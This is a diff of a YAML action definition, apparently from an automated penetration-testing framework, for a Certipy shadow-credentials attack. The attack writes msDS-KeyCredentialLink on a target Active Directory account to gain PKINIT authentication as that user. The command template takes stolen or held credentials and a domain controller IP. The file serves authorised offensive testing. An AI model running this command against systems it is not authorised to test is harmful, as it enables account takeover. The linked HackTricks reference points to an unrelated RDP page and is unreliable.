@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: certipy shadow auto -u '{username}@{domain}' -p '{password}' -account
-  '{target_user}' -dc-ip {target_ip}
+command_template: certipy shadow auto -u '{username}@{domain}' -p '{password}' -account '{target_user}' -dc-ip {target_ip}
 parser: generic_parser
 expected_effects:
 - adcs_findings
@@ -16,6 +15,30 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Adds msDS-KeyCredentialLink to target account, enabling PKINIT auth as
-  that user. Requires GenericWrite on target.
+mechanism: Adds msDS-KeyCredentialLink to target account, enabling PKINIT auth as that user. Requires GenericWrite on target.
 hacktricks_ref: network-services-pentesting/pentesting-rdp.md
+references:
+  ocd_mindmap_node_ids:
+  - 062be75b7f
+  - 0884fd7735
+  - 19fc58a688
+  - 1eab3dd158
+  - 22ee673b33
+  - 23e37dd06d
+  - 37e8774343
+  - 42119fbf32
+  - 43829c4252
+  - 4a5b178911
+  - 4a78adc22a
+  - 4e40160940
+  - 67d0395f88
+  - 682b8c0d85
+  - 6ef6b75aa3
+  - 7b1d58ff2d
+  - 95b0f65934
+  - 9a318199f3
+  - b5b12fca9c
+  - ba64fed1d7
+  - cea4159422
+  - ed94d5a403
+  - f3415c034c
